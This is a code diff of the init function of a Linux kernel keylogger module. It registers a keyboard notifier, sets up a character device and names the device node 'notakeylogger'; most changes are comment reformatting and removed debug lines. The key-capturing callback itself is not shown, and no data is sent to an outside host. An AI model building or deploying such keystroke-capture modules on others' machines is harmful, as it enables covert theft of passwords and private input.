@@ -110,29 +110,25 @@ static int __init key_logger_init(void)
     
     HARKLE_KINFO(DEVICE_NAME, "Key logger loading");  // DEBUGGING
 
-    // Initialize Globals
+    ////////////////////////
+    // Initialize Globals //
+    ////////////////////////
     // 1. Initialize myKeyLogger struct
     memset(myKL.keyStr, 0x0, BUFF_SIZE * sizeof(char));
     // 2. shift
-    shift = FALSE;
+    shift = 0;
 
-    // DEBUGGING
-    // for (i = 0; i <= 85; i++)
-    // {
-    //     translate_code(i, myKL.keyStr);
-    // }
-
+    /////////////////////////////////////////////////////////
+    // Add to the list of console keyboard event notifiers //
+    /////////////////////////////////////////////////////////
     if (!retVal)
     {
-        /*
-         * Add to the list of console keyboard event
-         * notifiers so the callback is
-         * called when an event occurs.
-         */
         register_keyboard_notifier(&kl_notif_block);
     }
 
-    // Setup character device
+    ////////////////////////////
+    // Setup character device //
+    ////////////////////////////
     // 1. Prepare the struct
     if (!retVal)
     {
@@ -153,7 +149,6 @@ static int __init key_logger_init(void)
     if (!retVal)
     {
         // Use dynamic allocation to assign our device a major number
-        // alloc_chrdev_region(dev_t*, uint fminor, uint count, char* name)
         retVal = alloc_chrdev_region(&(myLD.dev_num), 0, 1, CHRDEV_NAME);
         if (retVal < 0)
         {
@@ -161,11 +156,8 @@ static int __init key_logger_init(void)
         }
         else
         {
-            // printk(KERN_DEBUG "%s: alloc_chrdev_region() returned %d\n", CHRDEV_NAME, retVal);  // DEBUGGING
             myLD.major_num = MAJOR(myLD.dev_num);
             myLD.minor_num = MINOR(myLD.dev_num);
-            // printk(KERN_INFO "%s: Major number is %d\n", CHRDEV_NAME, myLD.major_num);  // DEBUGGING
-            // printk(KERN_INFO "%s: Minor number is %d\n", CHRDEV_NAME, myLD.minor_num);  // DEBUGGING
             retVal = 0;
         }
     }
@@ -184,14 +176,12 @@ static int __init key_logger_init(void)
     // 4. Allocate and initialize the character device structure
     if (!retVal)
     {
-        
-        myCdev = cdev_alloc();  // Create our cdev structure
+        // Create our cdev structure
+        myCdev = cdev_alloc();
+
         // Initialize the cdev structure
         if (myCdev)
         {
-            // myCdev->ops = &fops;            // Struct file_operations
-            // myCdev->owner = THIS_MODULE;    // Very common
-
             cdev_init(myCdev, &fops);
         }
         else
@@ -208,7 +198,7 @@ static int __init key_logger_init(void)
 
         if (retVal < 0)
         {
-            printk(KERN_ALERT "myTestDevice: unable to add cdev to kernel\n");
+            HARKLE_KERROR(CHRDEV_NAME, key_logger_init, "Unable to add cdev to kernel");  // DEBUGGING
         }
         else
         {
@@ -220,7 +210,6 @@ static int __init key_logger_init(void)
     // 6. Create a device and register it with sysfs 
     if (!retVal)
     {
-        // device = device_create(class, NULL, devno, NULL, CFAKE_DEVICE_NAME "%d", minor);
         device = device_create(cfake_class, NULL, myLD.dev_num, NULL, "notakeylogger" "%d", 1);
 
         if (IS_ERR(device))
@@ -231,7 +220,9 @@ static int __init key_logger_init(void)
         }
     }
     
-    // DONE
+    //////////
+    // DONE //
+    //////////
     HARKLE_KINFO(DEVICE_NAME, "Key logger loaded");  // DEBUGGING
     return retVal;
 }
